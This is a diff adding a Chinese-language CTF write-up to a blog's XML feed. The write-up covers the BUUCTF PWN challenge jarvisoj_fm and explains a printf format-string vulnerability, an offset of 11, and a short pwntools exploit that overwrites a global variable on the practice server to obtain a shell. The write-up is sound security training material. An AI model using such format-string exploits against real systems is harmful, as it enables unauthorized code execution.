@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>BUUCTF-PWN-jarvisoj_fm</title>
+      <link href="/20220201-ctf-jarvisoj_fm/"/>
+      <url>/20220201-ctf-jarvisoj_fm/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-jarvisoj-fm"><a href="#BUUCTF-PWN-jarvisoj-fm" class="headerlink" title="BUUCTF-PWN-jarvisoj_fm"></a>BUUCTF-PWN-jarvisoj_fm</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202012029915.png" alt="image-20220201202908077"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202012029109.png" alt="image-20220201202949804"></p><p>在<code>main</code>函数中可以看到，只要满足第12行的<code>if</code>条件，就可以拿到<code>shell</code>。而第9行中的<code>read</code>操作不可溢出，因为<code>buf</code>的长度为<code>0x5C</code>，但读入限制的长度为<code>0x50</code>，所以不能进行栈溢出。但是第10行使用了<code>printf</code>函数，那么我们可以考虑使用格式化字符串漏洞，从而使得下面的<code>if</code>条件成立。</p><h2 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202012035631.png" alt="image-20220201203513923"></p><p><code>0x61616161</code>代表了<code>aaaa</code>，所以可以数一下偏移为11。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27200</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x804A02C</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;x_addr: <span class="number">4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202202012037086.png" alt="image-20220201203702918"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BUUCTF-PWN-bjdctf_2020_babystack2</title>
       <link href="/20220128-ctf-b2b2/"/>
       <url>/20220128-ctf-b2b2/</url>
